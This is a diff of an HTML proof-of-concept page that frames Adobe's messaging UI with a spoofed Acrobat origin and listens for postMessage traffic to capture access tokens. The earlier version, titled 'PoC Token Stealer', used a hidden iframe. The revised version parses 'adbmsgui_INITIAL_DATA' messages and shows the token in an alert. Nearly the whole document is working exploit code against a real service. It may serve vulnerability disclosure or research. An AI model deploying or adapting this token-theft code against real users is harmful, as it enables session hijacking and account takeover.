@@ -1,19 +1,28 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>PoC Token Stealer</title>
-</head>
 <body>
-    <h1>Listening for Tokens...</h1>
-    <iframe id="victim" src="https://ui.messaging.adobe.com/3.8.16/index.html?lc=en_us#%7B%22window_origin%22%3A%22https%3A%2F%2Facrobat.adobe.com%22%2C%22iframe_origin%22%3A%22https%3A%2F%2Fui.messaging.adobe.com%2F3.8.16%2Findex.html%22%2C%22popped%22%3Afalse%7D%22" style="width:0;height:0;border:0;"></iframe>
+    <h1>Intercepting Adobe Messaging...</h1>
+    <iframe id="malicious_iframe" 
+        src="https://ui.messaging.adobe.com/3.8.16/index.html?lc=en_us#%7B%22window_origin%22%3A%22https%3A%2F%2Facrobat.adobe.com%22%2C%22iframe_origin%22%3A%22https%3A%2F%2Fui.messaging.adobe.com%2F3.8.16%2Findex.html%22%2C%22popped%22%3Afalse%7D" 
+        style="width:500px; height:500px;">
+    </iframe>
 
     <script>
         window.addEventListener("message", (event) => {
-            // Check if the message contains the accessToken
-            if (event.data && event.data.includes("accessToken")) {
-                console.log("CRITICAL: Stolen Token Found!");
-                console.log(event.data);
-                alert("Stolen Access Token: " + JSON.parse(event.data).message.accessToken);
+            console.log("Origin:", event.origin);
+            
+            let data = event.data;
+            
+            // Handle if data is a string (need to parse it)
+            if (typeof data === 'string') {
+                try { data = JSON.parse(data); } catch(e) { /* not JSON */ }
+            }
+
+            // Look for the adbmsgui_INITIAL_DATA message we saw earlier
+            if (data && (data.msgType === "adbmsgui_INITIAL_DATA" || data.accessToken)) {
+                console.warn("!!! TOKEN INTERCEPTED !!!");
+                console.log(data);
+                alert("Found Access Token: " + (data.accessToken || data.message.accessToken));
             }
         }, false);
     </script>
